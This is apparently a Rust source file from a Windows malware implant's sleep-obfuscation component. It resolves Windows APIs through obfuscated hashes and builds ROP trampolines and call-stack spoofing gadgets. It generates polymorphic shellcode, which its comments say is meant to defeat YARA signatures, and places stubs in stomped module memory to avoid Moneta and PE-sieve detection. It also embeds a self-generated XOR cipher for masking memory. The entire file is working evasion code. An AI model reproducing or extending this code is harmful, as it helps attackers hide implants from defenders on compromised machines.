use alloc::string::String;
use core::ffi::c_void;

use obfstr::{obfstring as s};
use anyhow::{Result, bail};
use dinvk::hash::{jenkins3, murmur3};
use dinvk::module::{
    get_module_address, 
    get_proc_address, 
    get_ntdll_address
};

use crate::{
    cfg::register_cfg_targets,
    spoof::StackSpoof,
    stub_page::StubPage,
    winapis::*
};

/// Global configuration object.
static CONFIG: spin::Once<Config> = spin::Once::new();

/// Optional image-backed region for stub placement.
/// Set via `set_stub_image_region()` *before* the first sleep cycle.
static STUB_IMAGE_REGION: spin::Once<(u64, usize)> = spin::Once::new();

/// Provide an image-backed RX region for hypnus stubs.
///
/// Call this from the implant **before** the first sleep cycle (i.e. before
/// `Config::new()` runs). If set, `Config::new()` will write stubs into this
/// region instead of allocating private RX memory, eliminating the
/// "Abnormal private executable memory" finding from Moneta/PE-sieve.
///
/// # Arguments
/// * `base` — address within the stomped module's `.text` section (beyond the implant code)
/// * `size` — available bytes in the region
pub fn set_stub_image_region(base: u64, size: usize) {
    STUB_IMAGE_REGION.call_once(|| (base, size));
}

/// Lazily initializes and returns a singleton [`Config`] instance.
#[inline]
pub fn init_config() -> Result<&'static Config> {
    CONFIG.try_call_once(Config::new)
}

/// Stores resolved DLL base addresses and function pointers.
#[derive(Default, Debug, Clone, Copy)]
pub struct Config {
    pub stack: StackSpoof,
    pub callback: u64,
    pub trampoline: u64,
    pub modules: Modules,
    pub wait_for_single: WinApi,
    pub wait_for_multiple: WinApi,
    pub base_thread: WinApi,
    pub enum_date: WinApi,
    pub system_function040: WinApi,
    pub system_function041: WinApi,
    /// Custom SIMD XOR cipher stub address (replaces SystemFunction040/041)
    pub custom_encrypt: u64,
    pub custom_decrypt: u64,  // Same address as encrypt (XOR is self-inverse)
    pub nt_continue: WinApi,
    pub nt_set_event: WinApi,
    pub rtl_user_thread: WinApi,
    pub nt_protect_virtual_memory: WinApi,
    pub rtl_exit_user_thread: WinApi,
    pub nt_get_context_thread: WinApi,
    pub nt_set_context_thread: WinApi,
    pub nt_test_alert: WinApi,
    pub nt_wait_for_single: WinApi,
    pub rtl_acquire_lock: WinApi,
    pub tp_release_cleanup: WinApi,
    pub rtl_capture_context: WinApi,
    pub zw_wait_for_worker: WinApi,
    /// 16-byte aligned stub for NtSetEvent2 threadpool callback.
    /// Replaces the raw Rust function pointer which may not be 16-byte aligned
    /// and would fail CFG validation on stomped modules.
    pub nt_set_event2_stub: u64,
    /// 16-byte aligned JMP trampoline to the fiber entry function.
    /// CFG requires indirect call targets to be 16-byte aligned.
    pub fiber_trampoline: u64,
    /// Base address of the consolidated stub page (for all ROP trampolines/stubs).
    /// Stored for potential cleanup. All callback/trampoline/cipher/gadget addresses
    /// point into this single page.
    pub stub_page_base: u64,
}

/// Insert 0-3 random NOP-equivalent instructions to break byte signatures.
/// Uses RDTSC for randomness to avoid importing RNG APIs.
fn insert_random_nops(code: &mut alloc::vec::Vec<u8>, seed: u64) {
    let count = (seed & 0x3) as usize; // 0-3 nops
    let nop_table: [&[u8]; 5] = [
        &[0x90],                    // 1-byte nop
        &[0x66, 0x90],              // 2-byte nop
        &[0x0F, 0x1F, 0x00],       // 3-byte nop
        &[0x0F, 0x1F, 0x40, 0x00], // 4-byte nop
        &[0x48, 0x87, 0xC0],       // xchg rax, rax (nop-equivalent)
    ];
    for i in 0..count {
        let idx = ((seed >> (i * 3 + 4)) as usize) % nop_table.len();
        code.extend_from_slice(nop_table[idx]);
    }
}

impl Config {
    /// Create a new `Config`.
    pub fn new() -> Result<Self> {
        // Resolve hashed function addresses for all required APIs
        let mut cfg = Self::winapis(Self::modules());

        // Check if an image-backed region was provided (eliminates private RX entirely).
        // Falls back to allocating a private page for standalone testing.
        let mut stubs = if let Some(&(base, size)) = STUB_IMAGE_REGION.get() {
            StubPage::from_image_region(base as *mut c_void, size)?
        } else {
            StubPage::new()?
        };

        // Write all stubs into the shared page (order doesn't matter)
        cfg.callback = Self::write_callback(&mut stubs)?;
        cfg.trampoline = Self::write_trampoline(&mut stubs)?;
        let cipher = Self::write_cipher_stub(&mut stubs)?;
        cfg.custom_encrypt = cipher;
        cfg.custom_decrypt = cipher;

        cfg.nt_set_event2_stub = Self::write_nt_set_event2_stub(
            &mut stubs, cfg.nt_set_event.as_u64(),
        )?;
        cfg.fiber_trampoline = Self::write_fiber_trampoline(
            &mut stubs, crate::hypnus::hypnus_fiber_addr(),
        )?;

        // Write stack spoof gadget into the shared page
        cfg.stack = StackSpoof::new_with_stubs(&cfg, &mut stubs)?;

        // Single RW→RX flip + lock for the entire page
        stubs.finalize()?;
        cfg.stub_page_base = stubs.base_addr();

        register_cfg_targets(&cfg);

        Ok(cfg)
    }

    /// Validates APIs required by the **timer** and **wait** ROP chain techniques.
    ///
    /// Called per-sleep-attempt so a failure is recoverable (the next cycle can retry)
    /// rather than poisoning the singleton `Config`.
    ///
    /// `uses_handles`: true when `WaitPrimitive::Handles` is in use (checks
    /// `WaitForMultipleObjects`); false for `Timeout` (checks `WaitForSingleObject`).
    pub fn validate_timer_wait_apis(&self, uses_handles: bool) -> Result<()> {
        use crate::hypnus::dbg;
        // Core ROP chain targets (used by every timer/wait cycle)
        macro_rules! check {
            ($field:ident, $label:expr) => {
                if self.$field.is_null() {
                    dbg(concat!("[V] null: ", $label, "\n\0").as_bytes());
                    bail!(s!(concat!("null API: ", $label)));
                }
            };
        }
        check!(nt_continue,               "nt_continue");
        check!(nt_protect_virtual_memory, "nt_protect_virtual_memory");
        check!(nt_get_context_thread,     "nt_get_context_thread");
        check!(nt_set_context_thread,     "nt_set_context_thread");
        check!(nt_set_event,              "nt_set_event");
        check!(nt_wait_for_single,        "nt_wait_for_single");
        check!(rtl_capture_context,       "rtl_capture_context");
        check!(base_thread,               "base_thread");
        check!(enum_date,                 "enum_date");
        check!(rtl_user_thread,           "rtl_user_thread");
        check!(rtl_acquire_lock,          "rtl_acquire_lock");
        check!(zw_wait_for_worker,        "zw_wait_for_worker");

        // Wait-primitive-specific target. Note: with the HandleBridge path,
        // ctxs[5] uses wait_for_single even when uses_handles=true, but the
        // bridge itself relies on thread-pool waits (TpAllocWait/TpSetWait),
        // not WFMO. We keep the wait_for_multiple check because callers still
        // perform a post-chain 0-ms WFMO to resolve which handle signaled.
        if uses_handles {
            if self.wait_for_multiple.is_null() {
                dbg(b"[V] null: wait_for_multiple\n\0");
                bail!(s!("null WaitForMultipleObjects"));
            }
        } else if self.wait_for_single.is_null() {
            dbg(b"[V] null: wait_for_single\n\0");
            bail!(s!("null WaitForSingleObject"));
        }

        dbg(b"[V] validate_timer_wait_apis OK\n\0");
        Ok(())
    }

    /// Validates APIs required by the **foliage** (APC) ROP chain technique.
    ///
    /// Foliage uses `NtCreateThreadEx` + `NtQueueApcThread` instead of thread pool
    /// timers, so it needs `rtl_exit_user_thread`, `nt_test_alert`, and
    /// `tp_release_cleanup` but does NOT need `rtl_capture_context` or `nt_set_event`.
    pub fn validate_foliage_apis(&self, uses_handles: bool) -> Result<()> {
        use crate::hypnus::dbg;
        macro_rules! check {
            ($field:ident, $label:expr) => {
                if self.$field.is_null() {
                    dbg(concat!("[V] null(foliage): ", $label, "\n\0").as_bytes());
                    bail!(s!(concat!("null API: ", $label)));
                }
            };
        }
        check!(nt_continue,               "nt_continue");
        check!(nt_protect_virtual_memory, "nt_protect_virtual_memory");
        check!(nt_get_context_thread,     "nt_get_context_thread");
        check!(nt_set_context_thread,     "nt_set_context_thread");
        check!(nt_wait_for_single,        "nt_wait_for_single");
        check!(rtl_exit_user_thread,      "rtl_exit_user_thread");
        check!(nt_test_alert,             "nt_test_alert");
        check!(tp_release_cleanup,        "tp_release_cleanup");
        check!(base_thread,               "base_thread");
        check!(enum_date,                 "enum_date");
        check!(rtl_user_thread,           "rtl_user_thread");
        check!(rtl_acquire_lock,          "rtl_acquire_lock");
        check!(zw_wait_for_worker,        "zw_wait_for_worker");

        if uses_handles {
            if self.wait_for_multiple.is_null() {
                dbg(b"[V] null(foliage): wait_for_multiple\n\0");
                bail!(s!("null WaitForMultipleObjects"));
            }
        } else if self.wait_for_single.is_null() {
            dbg(b"[V] null(foliage): wait_for_single\n\0");
            bail!(s!("null WaitForSingleObject"));
        }

        dbg(b"[V] validate_foliage_apis OK\n\0");
        Ok(())
    }

    /// Writes the thread pool callback trampoline into the shared stub page.
    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
    fn write_callback(stubs: &mut StubPage) -> Result<u64> {
        let seed = unsafe { core::arch::x86_64::_rdtsc() };
        let mut callback = alloc::vec::Vec::with_capacity(32);

        insert_random_nops(&mut callback, seed);
        callback.extend_from_slice(&[0x48, 0x89, 0xD1]);       // mov rcx, rdx
        insert_random_nops(&mut callback, seed >> 8);
        callback.extend_from_slice(&[0x48, 0x8B, 0x41, 0x78]); // mov rax, [rcx+0x78] (CONTEXT.RAX)
        insert_random_nops(&mut callback, seed >> 16);
        callback.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax

        Ok(stubs.write(&callback))
    }

    /// Writes the RtlCaptureContext trampoline into the shared stub page.
    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
    fn write_trampoline(stubs: &mut StubPage) -> Result<u64> {
        let seed = unsafe { core::arch::x86_64::_rdtsc() };
        let mut trampoline = alloc::vec::Vec::with_capacity(32);

        insert_random_nops(&mut trampoline, seed);
        trampoline.extend_from_slice(&[0x48, 0x89, 0xD1]); // mov rcx, rdx
        insert_random_nops(&mut trampoline, seed >> 8);
        trampoline.extend_from_slice(&[0x48, 0x31, 0xD2]); // xor rdx, rdx
        insert_random_nops(&mut trampoline, seed >> 16);
        trampoline.extend_from_slice(&[0xFF, 0x21]);        // jmp [rcx]

        Ok(stubs.write(&trampoline))
    }

    /// Writes the SIMD XOR cipher stub into the shared stub page.
    /// Uses SSE2 PXOR which is self-inverse (encrypt = decrypt).
    ///
    /// Calling convention (matches SystemFunction040):
    ///   RCX = memory pointer, RDX = size in bytes, R8 = unused
    fn write_cipher_stub(stubs: &mut StubPage) -> Result<u64> {
        // Generate random 16-byte XOR key using RDTSC
        let mut key = [0u8; 16];
        for i in 0..16 {
            let tsc = unsafe { core::arch::x86_64::_rdtsc() };
            key[i] = ((tsc >> ((i & 7) * 8)) ^ (tsc >> 32)) as u8;
            for _ in 0..((tsc & 0xF) + 1) { core::hint::spin_loop(); }
        }

        // Shellcode: SIMD XOR cipher
        // 50 bytes of code + 16 bytes of embedded key = 66 bytes total
        let shellcode_code: [u8; 50] = [
            0x53,                                     // push rbx
            0x56,                                     // push rsi
            0x48, 0x89, 0xCE,                         // mov rsi, rcx        ; data ptr
            0x89, 0xD1,                               // mov ecx, edx        ; size
            0xC1, 0xE9, 0x04,                         // shr ecx, 4          ; blocks = size/16
            0x85, 0xC9,                               // test ecx, ecx
            0x74, 0x1F,                               // jz .done (+31)
            0x48, 0x8D, 0x05, 0x1D, 0x00, 0x00, 0x00,// lea rax, [rip+29]   ; -> key
            0xF3, 0x0F, 0x6F, 0x00,                   // movdqu xmm0, [rax]  ; load key
            // .loop:
            0xF3, 0x0F, 0x6F, 0x0E,                   // movdqu xmm1, [rsi]  ; load block
            0x66, 0x0F, 0xEF, 0xC8,                   // pxor xmm1, xmm0    ; XOR
            0xF3, 0x0F, 0x7F, 0x0E,                   // movdqu [rsi], xmm1  ; store
            0x48, 0x83, 0xC6, 0x10,                   // add rsi, 16
            0xFF, 0xC9,                               // dec ecx
            0x75, 0xEC,                               // jnz .loop (-20)
            // .done:
            0x31, 0xC0,                               // xor eax, eax
            0x5E,                                     // pop rsi
            0x5B,                                     // pop rbx
            0xC3,                                     // ret
        ];

        let mut shellcode = alloc::vec::Vec::with_capacity(shellcode_code.len() + key.len());
        shellcode.extend_from_slice(&shellcode_code);
        shellcode.extend_from_slice(&key);

        Ok(stubs.write(&shellcode))
    }

    /// Writes a 16-byte aligned NtSetEvent2 replacement into the stub page.
    /// Threadpool callback signature: (Instance*, Param*, Timer*) -- event handle is in rdx.
    fn write_nt_set_event2_stub(stubs: &mut StubPage, nt_set_event: u64) -> Result<u64> {
        let mut code = alloc::vec::Vec::with_capacity(20);
        code.extend_from_slice(&[0x48, 0x89, 0xD1]);       // mov rcx, rdx (event handle → 1st param)
        code.extend_from_slice(&[0x48, 0x31, 0xD2]);       // xor rdx, rdx (previous_state = NULL)
        code.extend_from_slice(&[0x48, 0xB8]);              // mov rax, imm64
        code.extend_from_slice(&nt_set_event.to_le_bytes());
        code.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax
        Ok(stubs.write(&code))
    }

    /// Writes a 16-byte aligned JMP trampoline to the fiber entry function.
    fn write_fiber_trampoline(stubs: &mut StubPage, fiber_fn: u64) -> Result<u64> {
        let mut code = alloc::vec::Vec::with_capacity(16);
        code.extend_from_slice(&[0x48, 0xB8]);              // mov rax, imm64
        code.extend_from_slice(&fiber_fn.to_le_bytes());
        code.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax
        Ok(stubs.write(&code))
    }

    /// Resolves the base addresses of key Windows modules (`ntdll.dll`, `kernel32.dll`, etc).
    fn modules() -> Modules {
        // Load essential DLLs
        let ntdll = get_ntdll_address();
        let kernel32 = get_module_address(2808682670u32, Some(murmur3));
        let kernelbase = get_module_address(2737729883u32, Some(murmur3));
        let load_library = get_proc_address(kernel32, 4066094997u32, Some(murmur3));
        let cryptbase = {
            let mut addr = get_module_address(3312853920u32, Some(murmur3));
            if addr.is_null() {
                addr = uwd::spoof!(load_library, obfstr::obfcstr!(c"CryptBase").as_ptr())
                    .expect(obfstr::obfstr!("Error"))
            }

            addr
        };

        Modules {
            ntdll: Dll::from(ntdll),
            kernel32: Dll::from(kernel32),
            cryptbase: Dll::from(cryptbase),
            kernelbase: Dll::from(kernelbase),
        }
    }

    /// Resolves hashed API winapis addresses.
    fn winapis(modules: Modules) -> Self {
        let ntdll = modules.ntdll.as_ptr();
        let kernel32 = modules.kernel32.as_ptr();
        let cryptbase = modules.cryptbase.as_ptr();

        Self {
            modules,
            wait_for_single: get_proc_address(kernel32, 4186526855u32, Some(jenkins3)).into(),
            // WaitForMultipleObjects: jenkins3 hash = 2893429114
            wait_for_multiple: get_proc_address(kernel32, 2893429114u32, Some(jenkins3)).into(),
            base_thread: get_proc_address(kernel32, 4083630997u32, Some(murmur3)).into(),
            enum_date: get_proc_address(kernel32, 695401002u32, Some(jenkins3)).into(),
            system_function040: get_proc_address(cryptbase, 1777190324, Some(murmur3)).into(),
            system_function041: get_proc_address(cryptbase, 587184221, Some(murmur3)).into(),
            nt_continue: get_proc_address(ntdll, 3396789853u32, Some(jenkins3)).into(),
            rtl_capture_context: get_proc_address(ntdll, 1384243883u32, Some(jenkins3)).into(),
            nt_set_event: get_proc_address(ntdll, 1943906260, Some(jenkins3)).into(),
            rtl_user_thread: get_proc_address(ntdll, 1578834099, Some(murmur3)).into(),
            nt_protect_virtual_memory: get_proc_address(ntdll, 581945446, Some(jenkins3)).into(),
            rtl_exit_user_thread: get_proc_address(ntdll, 1518183789, Some(jenkins3)).into(),
            nt_set_context_thread: get_proc_address(ntdll, 3400324539u32, Some(jenkins3)).into(),
            nt_get_context_thread: get_proc_address(ntdll, 437715432, Some(jenkins3)).into(),
            nt_test_alert: get_proc_address(ntdll, 2960797277u32, Some(murmur3)).into(),
            nt_wait_for_single: get_proc_address(ntdll, 2606513692u32, Some(jenkins3)).into(),
            rtl_acquire_lock: get_proc_address(ntdll, 160950224u32, Some(jenkins3)).into(),
            tp_release_cleanup: get_proc_address(ntdll, 2871468632u32, Some(jenkins3)).into(),
            zw_wait_for_worker: get_proc_address(ntdll, 2326337356u32, Some(jenkins3)).into(),
            ..Default::default()
        }
    }
}

/// Get current stack pointer
#[inline]
pub fn current_rsp() -> u64 {
    let rsp: u64;
    unsafe { core::arch::asm!("mov {}, rsp", out(reg) rsp) };
    rsp
}
